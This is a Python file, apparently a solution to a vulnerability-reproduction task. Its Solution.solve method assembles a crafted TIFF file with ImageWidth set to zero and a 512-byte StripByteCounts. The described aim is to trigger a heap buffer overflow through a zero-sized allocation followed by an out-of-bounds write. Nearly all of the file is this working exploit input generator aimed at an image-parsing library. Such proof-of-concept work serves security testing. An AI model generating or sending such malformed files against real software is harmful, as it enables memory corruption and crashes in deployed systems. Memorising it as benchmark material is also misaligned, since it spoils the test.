import struct
import tarfile
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability.
        The vulnerability allows zero width/height images, leading to a 0-sized allocation
        followed by an out-of-bounds write based on the strip byte counts.
        """
        
        # TIFF Header: Little Endian ('II'), Version 42, Offset to first IFD (8)
        header = struct.pack('<2sHI', b'II', 42, 8)
        
        # Payload size (StripByteCounts)
        # A sufficient size to overflow the small allocation resulting from malloc(0)
        payload_size = 512
        
        # IFD Tags
        # We use a standard TIFF structure but set ImageWidth (256) to 0.
        tags = [
            (256, 4, 1, 0),             # ImageWidth = 0 (Trigger)
            (257, 4, 1, 10),            # ImageLength = 10
            (258, 3, 1, 8),             # BitsPerSample = 8
            (259, 3, 1, 1),             # Compression = 1 (None)
            (262, 3, 1, 1),             # PhotometricInterpretation = 1 (BlackIsZero)
            (273, 4, 1, 0),             # StripOffsets (Placeholder, calculated below)
            (277, 3, 1, 1),             # SamplesPerPixel = 1
            (278, 4, 1, 10),            # RowsPerStrip = 10
            (279, 4, 1, payload_size)   # StripByteCounts = 512
        ]
        
        # Calculate offsets
        num_entries = len(tags)
        # IFD size: 2 bytes count + (12 bytes * num_entries) + 4 bytes next offset
        ifd_size = 2 + (num_entries * 12) + 4
        
        # Data comes immediately after IFD
        data_offset = 8 + ifd_size
        
        # Update StripOffsets (Tag 273) to point to the data area
        # Tags are tuples, so we recreate the list with the updated value
        tags = [
            (tag, type_, count, data_offset) if tag == 273 else (tag, type_, count, val)
            for tag, type_, count, val in tags
        ]
        
        # Tags must be sorted by tag ID in TIFF
        tags.sort(key=lambda x: x[0])
        
        # Construct IFD bytes
        ifd = bytearray()
        ifd += struct.pack('<H', num_entries)
        for tag, type_, count, val in tags:
            # Pack each entry: Tag(2), Type(2), Count(4), Value/Offset(4)
            ifd += struct.pack('<HHII', tag, type_, count, val)
        ifd += struct.pack('<I', 0) # Next IFD offset (0 = none)
        
        # Construct payload
        payload = b'A' * payload_size
        
        return header + ifd + payload